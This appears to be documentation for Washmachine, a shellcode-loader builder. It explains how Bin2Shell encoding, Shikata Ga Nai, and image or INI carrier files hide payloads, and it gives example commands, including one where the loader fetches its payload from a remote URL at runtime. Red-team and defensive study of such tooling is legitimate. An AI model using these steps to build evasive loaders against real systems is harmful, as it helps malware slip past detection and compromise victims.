# Using Encoding in Washmachine

Washmachine integrates Bin2Shell encoding directly into the compile pipeline. When you pass `-Encoder`, `-Envelope`, or `-Carrier` to the `encode` command, Washmachine invokes Bin2Shell on your shellcode and injects the resulting C++ reconstruction code into the loader template before compilation.

## How it fits into the build

```text
1. Resolve shellcode bytes (file / hex / URL)
2. If encoding options are set:
   │
   ├─ Invoke Bin2Shell with the selected encoder, envelope,
   │   carrier, and polymorphism settings
   │
   ├─ Inline mode: the generated C++ is injected into the
   │   {{SHELLCODE_SOURCE}} template placeholder
   │
   ├─ Web mode (--ShellcodeUrl): a YAML bundle is produced
   │   containing the HTTP fetch helper and the encoded payload
   │
   └─ Carrier mode: a wrapped file (PNG, BMP, ICO, INI) is
       copied alongside the build output; the loader reads
       and unwraps it at runtime
3. Template is rendered with the encoded payload section
4. Compiler builds the final executable
```

## Encoding flags on `encode`

All Bin2Shell options are surfaced as first-class flags on the `encode` command:

| Washmachine flag | Effect |
|---|---|
| `-Encoder <N>` | Select encoder by index (see `show encoders`) |
| `-Envelope <N>` | Select envelope by index (see `show envelopes`) |
| `-Sgn` | Apply Shikata Ga Nai encoding before Bin2Shell |
| `-SgnCount <N>` | Number of SGN encoding iterations |
| `-ShellcodeUrl <url>` | Emit a web-fetch loader; payload is served at this URL at runtime |

## Viewing available algorithms

```powershell
# List all encoders and envelopes
washmachine-cli show encoders
washmachine-cli show envelopes

# Or see everything at once
washmachine-cli show all
```

If these return empty, Bin2Shell isn't provisioned yet — run `washmachine-cli provision` first.

## Example builds

```powershell
# Encode with ChaCha20 + Base64 envelope
washmachine-cli encode -Shellcode payload.bin -Encoder 10 -Envelope 2

# Encode + web delivery (payload fetched at runtime)
washmachine-cli encode -ShellcodeUrl http://host/payload.b64 -Encoder 10 -Envelope 2

# SGN preprocessing before Bin2Shell encoding
washmachine-cli encode -Shellcode payload.bin -Sgn -SgnCount 3 -Encoder 7
```

## Calling Bin2Shell directly

Bin2Shell is a standalone tool — you can invoke it directly for use cases outside the Washmachine build pipeline:

```powershell
cd Tools\Bin2Shell
python main.py -e 10 -v 2 payload.bin -o loader.cpp
```

The generated `loader.cpp` can be compiled independently with any C++ compiler. See the [Bin2Shell overview](/bin2shell/overview) for the full standalone CLI reference.

## Provisioning

Bin2Shell is auto-provisioned the first time encoding options are used. To install it manually:

```powershell
washmachine-cli provision
```

Verify with:

```powershell
washmachine-cli doctor
washmachine-cli show encoders
washmachine-cli show envelopes
```

See [`provision`](/cli/provision) and [`doctor`](/cli/doctor) for the full reference.

